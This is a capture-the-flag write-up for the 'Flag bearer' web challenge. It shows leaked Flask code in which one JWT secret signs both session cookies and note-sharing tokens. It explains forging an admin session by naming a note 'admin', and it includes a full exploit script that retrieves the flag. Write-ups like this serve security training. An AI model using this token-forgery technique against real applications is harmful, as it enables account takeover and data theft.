# Flag bearer

We are given an URL to a web app, which allows to create and share notes. We know that the flag is in admin's notes.

By modifying requests and triggering errors we can leak parts of the source code:

```py
def getuser():
    if "session" not in request.cookies:

        return None

    return jwt.decode(request.cookies.get("session"), SECRET, algorithms="HS256")["name"]
```

```py

@app.route("/notes", methods=["GET", "POST"])
def notes():
    if "session" not in request.cookies:
        return render_template("index.html", error="User is not logged in")

    u = db.getuser(getuser())
    if u == None:
        return render_template("index.html", error="Invalid user? WTF how did you log in.")

    if request.method == "GET":
        return render_template("notes.html", user=u)
 

    name = request.json['name']
    content = request.json['content']

    for user in db.users:
        for note in user.notes:
            if note.name == name:
                return "Duplicated note name", 401

    u.notes.append(Note(name, content))
```

```py
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")

    username = request.form['username']
    password = request.form['password']

    try:
        if db.login_correct(username, password):
            r = make_response(redirect("/"))
            r.set_cookie("session", jwt.encode({"name": username}, SECRET))

```



We can see that the same JWT secret is used for both authentication and sharing notes. That's very useful to forge admin's session token.
We can do this by creating a note named `admin`, and setting the received sharing token as the `session` cookie.

solve.py:
```py
import requests
import re

s = requests.Session()
url = 'https://flag-bearer.ecsc23.hack.cert.pl'

s.post(f'{url}/login', data={'username': 'aaa', 'password': 'aaa'})
s.post(f'{url}/notes', json={'name': 'admin', 'content': ''})

r = s.get(f'{url}/notes')
token = re.findall(r'id="admin"[\s\S]+?<code>([a-zA-Z0-9.\-_]+)<\/code>', r.text, re.M)[0]
print(token)

r = requests.get(f'{url}/notes', cookies={'session': token})
flag = re.findall(r'ecsc23\{.+\}', r.text)[0]
print(flag)
```